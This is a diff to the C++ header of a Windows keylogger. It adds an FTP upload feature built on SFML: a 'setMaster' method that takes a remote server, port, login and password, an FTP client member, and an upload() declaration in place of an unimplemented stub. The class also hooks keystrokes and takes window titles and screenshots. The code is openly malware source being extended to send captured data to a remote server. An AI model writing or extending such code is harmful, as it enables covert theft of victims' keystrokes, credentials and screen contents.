@@ -1,7 +1,14 @@
 #ifndef H_KEYLOGGER
 #define H_KEYLOGGER
 
+//will activate FTP upload functionality, which needs SFML. Comment out for a full standalone version without FTP upload
+#define USE_FTP
+
 #define _WIN32_WINNT 0x0501
+
+#ifdef USE_FTP
+#define SFML_STATIC
+#endif
 
 #include <windows.h>
 #include <iostream>
@@ -9,6 +16,10 @@
 #include <fstream>
 #include <string>
 #include <sstream>
+
+#ifdef USE_FTP
+#include <SFML/Network.hpp>
+#endif
 
 #include "screenshot.h"
 
@@ -84,6 +95,9 @@ class KeyLogger {
     bool KeyLogger::isRShiftDown() { return rshiftDown; }
     void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
 
+    //setup FTP master server
+    void setMaster(std::string server, int port, std::string login, std::string password, std::string _uploadDir=".");
+
     protected:
 
     KeyLogger();
@@ -105,9 +119,7 @@ class KeyLogger {
 
     void writeBuffer();
 
-    void upload() {
-        //not implemented yet
-    }
+    void upload();
 
     static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
 
@@ -131,6 +143,12 @@ class KeyLogger {
     std::string activeWindowTitle;
 
     time_t lastUpload;
+
+    #ifdef USE_FTP
+    sf::Ftp ftpClient;
+    #endif
+    bool useFTP;
+    std::string uploadDir;
 };
 
 #endif // H_KEYLOGGER
